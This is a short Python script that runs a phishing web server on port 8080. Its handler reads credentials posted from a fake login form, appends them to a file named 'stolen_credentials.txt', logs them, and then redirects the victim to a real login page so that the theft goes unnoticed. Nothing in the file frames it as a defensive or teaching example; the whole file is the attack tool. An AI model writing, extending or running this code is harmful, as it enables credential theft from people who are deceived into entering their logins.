from http.server import SimpleHTTPRequestHandler, HTTPServer
import logging

class PhishingHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        """Capture credentials from the fake login form."""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        # Log captured credentials
        with open("stolen_credentials.txt", "a") as f:
            f.write(post_data + "\n")

        logging.info(f"Captured credentials: {post_data}")

        # Redirect victim to the real website
        self.send_response(302)
        self.send_header('Location', 'https://real-login-page.com')
        self.end_headers()

# Start the phishing server
def run_server(port=8080):
    logging.basicConfig(level=logging.INFO)
    server_address = ('', port)
    httpd = HTTPServer(server_address, PhishingHandler)
    logging.info(f"Phishing web server running on port {port}...")
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
